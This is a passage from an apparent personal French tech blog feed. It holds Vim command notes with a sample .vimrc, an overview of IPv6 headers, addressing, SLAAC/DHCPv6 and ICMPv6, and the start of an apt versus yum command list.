&lt;h2 id=&quot;three-modes&quot;&gt;three modes&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;normal&quot;&gt;normal&lt;/h4&gt;

&lt;p&gt;Mode de base lorsque l’on lance l’editeur, ce mode doit être utilisé pour visualiser le contenu du fichier.&lt;/p&gt;

&lt;h4 id=&quot;insertion&quot;&gt;insertion&lt;/h4&gt;

&lt;p&gt;Mode accessible avec la touche &lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt;, mode utilisé pour l’ajout et la suppression de texte.&lt;/p&gt;

&lt;h4 id=&quot;visual&quot;&gt;visual&lt;/h4&gt;

&lt;p&gt;Mode accessible par la touche &lt;code class=&quot;highlighter-rouge&quot;&gt;v&lt;/code&gt; pour effectuer une sélection caractère par caractère. La combinaison  &lt;code class=&quot;highlighter-rouge&quot;&gt;shift-v&lt;/code&gt; permet de réaliser de la sélection par ligne et enfin, &lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl-v&lt;/code&gt; permet de réaliser de la sélection par colonnes.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;commands&quot;&gt;commands&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;save&quot;&gt;save&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;:w&lt;/code&gt; : « write », enregistrer&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;:saveas test.txt&lt;/code&gt; : enregistrer sous&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;cancel&quot;&gt;cancel&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;:cq&lt;/code&gt; : cancel and quit, annuler des modifications&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;u&lt;/code&gt; : un-do, annuler&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl-R&lt;/code&gt; : re-do&lt;/li&gt;
  &lt;li&gt;nmap U &lt;C-R&gt;&lt;/C-R&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;search-text&quot;&gt;search text&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/expression&lt;/code&gt; : pour chercher vers le bas&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;?expression&lt;/code&gt;:  pour chercher vers le haut&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; : pour occurrence suivantes&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt; : pour occurrence précédente&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; cherche le mot sous le curseur vers le bas&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\#&lt;/code&gt; : vers le haut&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;move&quot;&gt;move&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hjkl&lt;/code&gt; : gauche, bas, haut droite&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;{&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;}&lt;/code&gt; : sauter ligne vide précédente, suivante&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gg&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;G&lt;/code&gt; : sauter au début, fin&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;w&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; : mot suivant, précédent&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;W&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;B&lt;/code&gt; : MOT suivant et précédent délimité par espace&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;e&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;ge&lt;/code&gt; : fin de mot suivant, précédent&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;E&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;gE&lt;/code&gt; : fin de MOT suivant, précédent&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; : début, fin de ligne&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;actions&quot;&gt;actions&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;d&lt;/code&gt; : « delete » + couper&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;y&lt;/code&gt; : « yank » copier&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt; : « paste » coller&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; : « change », couper + passer en mode insertion&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt; : répéter la dernière action&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;opérateur + mouvement
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dw&lt;/code&gt; : delete word&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;d$&lt;/code&gt; : delete jusqu’à la fin de la ligne&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;yW&lt;/code&gt; : copie jusqu’à la fin du mot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cw&lt;/code&gt; : efface jusqu’à la fin du mot et passe en mode insertion&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;[répétition] opérateur [répétition] mouvement
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3dw&lt;/code&gt; : efface un mot, trois fois&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;d3w&lt;/code&gt; : efface trois mots (c’est pareil de précédemment)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5d3w&lt;/code&gt; : efface trois mots, cinq fois&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;c3w&lt;/code&gt; : efface trois mots et passe en mode insertion&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;object-modifier&quot;&gt;object modifier&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;modifieur + objet&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Modifieur :
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;i&lt;/code&gt; : “in”&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; : “around”&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Objet
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;w&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;W&lt;/code&gt; : mot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt; : phrase, paragraphe (point / ligne vide)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;B&lt;/code&gt; : bloc (parenthèses / accolades)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;t&lt;/code&gt; : tag (html/xml)&lt;/li&gt;
      &lt;li&gt;[, ], {, }, (, ), ‘, « …&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Action + modifieur + objet
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vaw&lt;/code&gt; : sélectionne le mot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;daw&lt;/code&gt; : supprime le mot&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dip&lt;/code&gt; : supprime le paragraphe (sans la ligne de séparation)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dap&lt;/code&gt; : supprime le paragraphe (avec la ligne de séparation)&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ci’&lt;/code&gt; : change le contenu d’une chaîne&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vimrc&quot;&gt;.vimrc&lt;/h2&gt;

&lt;p&gt;Le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.vimrc&lt;/code&gt; présent dans le répertoire de connexion permet de paramétrer l’éditeur.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot; Non compatible avec Vi
set nocompatible

&quot;&lt;/span&gt; Syntaxe et thème
syntax on
colorscheme Tomorrow-Night-Bright
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;t_Co&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;256

&lt;span class=&quot;s2&quot;&gt;&quot; Num ligne et colonne, et commande
set number
set ruler
set showcmd

&quot;&lt;/span&gt; Auto-indentation à 2 espaces
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;autoindent
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;tabstop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;shiftwidth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;softtabstop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;expandtab

&lt;span class=&quot;s2&quot;&gt;&quot; Indentation en fonction du ficher
filetype plugin indent on

&quot;&lt;/span&gt; Permet de donner paramatrés sur fichier pour vim
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;modelines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5

&lt;span class=&quot;s2&quot;&gt;&quot; Meilleur completion cli
set wildmenu
set wildmode=longest,full

&quot;&lt;/span&gt; Aide en cas d&lt;span class=&quot;s1&quot;&gt;'erreurs
set visualbell

&quot; Encodage
set encoding=utf-8

&quot; Nombre de ligne entre curseur et bord
set scrolloff=10

&quot; Pour indentation
set backspace=indent,eol,start

&quot; Permet de switcher entre fichiers sans sauvegarder
set hidden

&quot; Montre le mode
set showmode

&quot; Montrer ligne en cours
set cursorline

&quot; Toujours afficher barre d'&lt;/span&gt;etat
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;laststatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2

&lt;span class=&quot;s2&quot;&gt;&quot; Ignorer casse sauf quand majuscule
set ignorecase
set smartcase
set showmatch

&quot;&lt;/span&gt; Utiliser souris
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;clipboard&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;unnamedplus
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mouse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;a


&lt;span class=&quot;s2&quot;&gt;&quot; recherche incrémentale
set hlsearch
set incsearch

&quot;&lt;/span&gt; U fait le même chose que ctrl + r
nmap U &amp;lt;C-R&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>ipv6</title>
   <link href="http://localhost:4000/network/2018/01/20/ipv6/"/>
   <updated>2018-01-20T00:00:00+01:00</updated>
   <id>http://localhost:4000/network/2018/01/20/ipv6</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;pourquoi-ipv6-&quot;&gt;pourquoi ipv6 ?&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;limites-dipv4&quot;&gt;limites d’ipv4&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;pénurie d’adresses&lt;/li&gt;
  &lt;li&gt;croissance des tables de routage&lt;/li&gt;
  &lt;li&gt;manque de connectivité bout en bout (NAT)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;caractéristiques-dipv6&quot;&gt;caractéristiques d’ipv6&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;IPv6 : 128 bits, 16 octets, 8 groupes de 16 bits, en hexa&lt;/li&gt;
  &lt;li&gt;espace d’adressage plus important&lt;/li&gt;
  &lt;li&gt;plus de traduction d’adresse (NAT)&lt;/li&gt;
  &lt;li&gt;traitement plus efficace, en-têtes simplifiées&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;simplification&quot;&gt;simplification&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;omettre les 0 en début de segment&lt;/li&gt;
  &lt;li&gt;omettre les séquences composées uniquement de 0 (une seul fois)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2001:0db8:0000:23b0:0000:0000:069c:17&lt;/code&gt; =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;2001:db8:0:23b0::69c:17&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;url&quot;&gt;url&lt;/h4&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://[2001:db8:0:23b0::69c:17]:8080/index.html&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;coexistence-ipv4-et-ipv6&quot;&gt;coexistence ipv4 et ipv6&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Double pile : les périphériques utilisent une pile IPv4 et une pile IPv6&lt;/li&gt;
  &lt;li&gt;Tunneling : paquets IPv6 dans paquets IPv4 (encapsulation)&lt;/li&gt;
  &lt;li&gt;Traduction : les périphériques IPv6 utilise NAT64 pour communiquer avec périphériques IPv4&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;en-tête-ipv6&quot;&gt;en-tête ipv6&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;40 octets&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;deux fois plus qu’en IPv4&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Version&lt;/code&gt;: 4 bits, valeur 6 car IPv6&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Traffic Class&lt;/code&gt;: 8 bits, priorité pour QoS&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Flow Label&lt;/code&gt;: 20 bits, si même étiquette, alors paquets traités de la même manière par le routeur&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Payload length&lt;/code&gt;: 16 bits, longueur des données utiles&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Next Header&lt;/code&gt;: 8 bits, prochain header ou protocole (comme en v4)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Hop Limit&lt;/code&gt;: 8 bits, TTL&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Source Address&lt;/code&gt;: 128 bits, champs protocole en v4&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Destination Address&lt;/code&gt;: 128 bits, champs protocole en v4&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Pas de fragmentation des paquets par les routeurs en IPv6. Ni d’options&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;types-den-tête&quot;&gt;types d’en-tête&lt;/h4&gt;

&lt;p&gt;Le champ &lt;code class=&quot;highlighter-rouge&quot;&gt;Next Header&lt;/code&gt;peut être examiné par chaque intermédiaire durant le routage, ou simplement par le destinataire (c’est une différence par rapport à IPv4).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Hop-by-Hop Header: traité par chaque routeur&lt;/li&gt;
  &lt;li&gt;Destination Options Header: examiné seulement par le destinataire&lt;/li&gt;
  &lt;li&gt;Routing Header: routage choisi par la source, liste des routeurs à visiter, @src et @dst changent à chaque passage par un routeur&lt;/li&gt;
  &lt;li&gt;Fragment Header: envoi de paquets plus grand que le MTU, en IPv6, fragmentation est réalisée que par la source et non plus les routeurs, traité par destinataire pour défragmentation&lt;/li&gt;
  &lt;li&gt;Authentication Header: authentification et intégrité des données (signature)&lt;/li&gt;
  &lt;li&gt;Privacy Header: chiffrement du contenu à protéger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Un paquet IPv6 peut contenir une suive d’en-têtes:
&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv6 Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Routing Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;TCP Header&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;fragmentation&quot;&gt;fragmentation&lt;/h4&gt;

&lt;p&gt;La source utilise path MTU discovery pour trouver le bon MTU pour tout le chemin.&lt;/p&gt;

&lt;p&gt;De la elle peut créer plusieurs fragments:
&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv6 Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Data 1 + Data 2 + Data 3&lt;/code&gt;
devient:
&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv6 Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Data 1&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv6 Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Data 2&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv6 Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Fragment Header&lt;/code&gt; &amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Data 3&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;qos&quot;&gt;qos&lt;/h4&gt;

&lt;p&gt;La QoS en IPv6 se base sur le &lt;code class=&quot;highlighter-rouge&quot;&gt;Flow Label&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;permet de classifier des datagrammes appartenant à un même flux&lt;/li&gt;
  &lt;li&gt;flux: séquence de datagrammes qui doivent être traités de la même manière&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;types-dadresses-ipv6&quot;&gt;types d’adresses ipv6&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;-unicast&quot;&gt;@ unicast&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Adresse globale
    &lt;ul&gt;
      &lt;li&gt;portée globale&lt;/li&gt;
      &lt;li&gt;unique&lt;/li&gt;
      &lt;li&gt;routable&lt;/li&gt;
      &lt;li&gt;publique&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2000::/3&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Adresse Link-local
    &lt;ul&gt;
      &lt;li&gt;portée locale&lt;/li&gt;
      &lt;li&gt;communication dans le sous-réseau uniquement. Toute interface IPv6 doit avoir une adresse Link-local. Adresse automatique si pas de configuration statique, permet communication au sein du sous-réseau sans adresse de mono-diffusion globale.&lt;/li&gt;
      &lt;li&gt;non routable&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FE80::/10&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;::1/128&lt;/code&gt; (= &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; en IPv4)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;-multicast&quot;&gt;@ multicast&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ff00::/8&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Multidiffusion attribuée
    &lt;ul&gt;
      &lt;li&gt;groupe de multidiffusion à tous les nœuds &lt;code class=&quot;highlighter-rouge&quot;&gt;FF02::1&lt;/code&gt; (@diffusion en IPv4), pour message annonce du routeur (ICMPv6)&lt;/li&gt;
      &lt;li&gt;groupe de multidiffusion à tous les routeurs &lt;code class=&quot;highlighter-rouge&quot;&gt;FF02::2&lt;/code&gt; permet de contacter un routeur par sollicitation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Multidiffusion de nœud sollicité
    &lt;ul&gt;
      &lt;li&gt;comme @ multidiffusion à tous les nœuds, avantage : est mappée à une adresse de multidiffusion Ethernet MAC spéciale, cela permet à la carte réseau de filtrer la trame en examinant l’adresse MAC de destination sans forcément passer la trame à IPv6&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Global routing prefix (/48)&lt;/td&gt;
      &lt;td&gt;Subnet-id (/16)&lt;/td&gt;
      &lt;td&gt;Interface id&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Cette structure facilite la migration d’un FAI à un autre : il suffit de changer le préfixe.&lt;/p&gt;

&lt;p&gt;Vrai découpage:
Registry: /12
ISP prefix: /32
Site prefix: /48
Lan prefix: /64
Interface ID: /128&lt;/p&gt;

&lt;p&gt;L’IANA alloue des préfixes IPv6 pour les 5 RIRs, qui les distribes derrière.&lt;/p&gt;

&lt;h4 id=&quot;adresses-anycast&quot;&gt;Adresses anycast&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;choix du destinataire le plus proche parmi un groupe défini par plusieurs interfaces disposant de la mêmeadresse unicast&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;configuration-des-hôtes-en-ipv6&quot;&gt;Configuration des hôtes en IPv6&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Le message d’annonce du routeur indique à un hôte comment obtenir son adresse de diffusion globale, ce message varie selon le mode de configuration choisi. Il est envoyé toutes les 200 secondes, ou suite à une sollicitation d’un hôte. En IPv6 l’adresse de la passerelle par défaut (gateway) est l’adresse link-local de la source de ce message.&lt;/p&gt;

&lt;h4 id=&quot;mode-slaac-par-défaut&quot;&gt;Mode SLAAC (par défaut)&lt;/h4&gt;

&lt;p&gt;Permet d’obtenir préfixe + longueur du préfixe du réseau dans lequel se trouve le périphérique. Généralement, toutes ces informations permettent d’obtenir les 64 premiers bits. C’est au périphérique de générer les 64 bits restant de son adresse de diffusion globale.&lt;/p&gt;

&lt;h4 id=&quot;mode-slaac-et-dhcpv6-sans-état&quot;&gt;Mode SLAAC et DHCPv6 sans état&lt;/h4&gt;

&lt;p&gt;Mode précèdent (SLAAC) + informe le périphérique de contacter le serveur DHCPv6 afin de demander la configuration DNS ainsi que le nom de domaine. On parle de DHCPv6 « sans état » car celui-ci n’a pas de tableau de toutes les adresses distribuées (pool).&lt;/p&gt;

&lt;h4 id=&quot;mode-dhcpv6-avec-état&quot;&gt;Mode DHCPv6 avec état&lt;/h4&gt;

&lt;p&gt;Similaire à IPv4 en DHCPv4, le message d’annonce invite le périphérique à contacter le serveur DHCPv6 du réseau afin d’obtenir une adresse de diffusion globale. Cette adresse est donc fournie par le serveur DHCPv6 et n’est plus généré de manière aléatoire sur l’hôte. On parle de DHCPv6 « avec état » car celui-ci tient à jour un tableau de toutes les adresses distribuées (pool).&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;protocole-icmpv6&quot;&gt;Protocole ICMPv6&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;En IPv6, le protocole ICMPv6 à de nouvelles fonctionnalitées pour la configuration des hôtes sur un réseau.&lt;/p&gt;

&lt;h4 id=&quot;routeur--périphérique&quot;&gt;Routeur &amp;lt;–&amp;gt; Périphérique&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;utilisé par les hôtes afin de réaliser une sollicitation de message d’annonce de routeur (RS)&lt;/li&gt;
  &lt;li&gt;utilisé par les routeurs pour envoyer des messages d’annonce de routeur (RA) dans tout le sous-réseau&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;périphérique--périphérique&quot;&gt;Périphérique &amp;lt;–&amp;gt; Périphérique&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;message de sollicitation de voisin&lt;/li&gt;
  &lt;li&gt;message d’annonce de voisin&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pour éviter que 2 périphériques aient la même adresse de diffusion globale, le protocole DAD (Duplicate Address Detection) est utilisé. Celui-ci permet la détection d’adresses dupliquées. Pour cela, après qu’un hôte ait généré sont adresse de diffusion globale. Celui-ci envoie un message de sollicitation de voisin avec comme adresse de sollicitation, l’adresse qu’il vient de générer :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Si une réponse est reçue, cela signifie qu’un autre hôte sur le réseau possède déjà cette adresse. Dans ce cas, il doit régénérer une autre adresse.&lt;/li&gt;
  &lt;li&gt;Si par contre celui-ci ne reçoit aucune réponse, cela signifie qu’il n’y pas de duplication d’adresse dans le réseau et que l’hôte peut garder cette adresse pour lui.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Plutôt malin.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>apt et yum</title>
   <link href="http://localhost:4000/linux/2018/01/18/apt-et-yum/"/>
   <updated>2018-01-18T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2018/01/18/apt-et-yum</id>
   <content type="html">&lt;!--more--&gt;

&lt;p&gt;APT et YUM sont les deux principaux gestionnaires de paquets des deux grandes familles de distributions Linux que sont les Red Hat (RHEL, CentOS, Fedora,…) et les Debian (Ubuntu,…). Ils traitent respectivement les packages au format DPKG et RPM.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;commandes&quot;&gt;commandes&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# update local database&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt update
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum makecache 

&lt;span class=&quot;c&quot;&gt;# clear database&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt clean
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum clean all

&lt;span class=&quot;c&quot;&gt;# update package&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt upgrade
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum check-update
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum update

